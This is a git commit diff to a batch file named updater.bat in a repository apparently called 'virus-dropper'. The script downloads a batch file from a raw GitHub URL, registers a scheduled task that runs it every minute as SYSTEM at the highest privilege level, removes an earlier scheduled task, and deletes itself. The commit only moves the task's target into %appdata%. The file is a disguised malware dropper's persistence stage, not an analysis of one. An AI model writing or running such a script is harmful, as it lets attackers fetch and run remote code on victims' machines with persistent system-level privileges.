19fda0aae7053a5d287a37c4c26d0e6a7c816508
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-06 21:15:33 -0400

    Update updater.bat

--- updater/updater.bat
+++ updater/updater.bat
@@ -1,5 +1,5 @@
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Uninstall.bat" --output "uninstall.bat"
-SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\uninstall.bat" /TN "uninstallTEMP" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC MINUTE /TR "%appdata%\uninstall.bat" /TN "uninstallTEMP" /RL HIGHEST /RU SYSTEM
 powershell -Command "Unregister-ScheduledTask -TaskName 'updateTEMP' -Confirm:$false"
 call :deleteSelf&exit
 :deleteSelf
